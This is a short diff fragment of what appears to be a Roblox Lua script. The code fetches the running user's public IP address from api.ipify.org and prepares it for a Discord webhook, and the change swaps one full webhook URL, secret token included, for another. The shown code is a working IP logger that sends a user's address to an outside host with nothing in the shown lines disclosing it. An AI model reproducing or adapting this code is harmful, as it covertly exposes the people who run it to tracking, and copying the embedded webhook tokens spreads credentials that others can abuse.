@@ -7,7 +7,7 @@ local webhookcheck =
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 local url =
-   "https://canary.discord.com/api/webhooks/1088515994986750014/jDbOkBNfuw9YU2pL6356ObI-hyHV85o-AqUBsaA57HGYFNZkUGmN_YIFv4Da7ynlCDv3"
+   "https://discord.com/api/webhooks/1088697841435807784/saJMfUGRuREJD0SqZ7aHt1tIsR_SnEcHcCLvVhMJLhjZG-QW4VBE__LKxIEFqseQlPUv"
 local data = {
    ["content"] = "LEZZGOOOO!",
    ["embeds"] = {
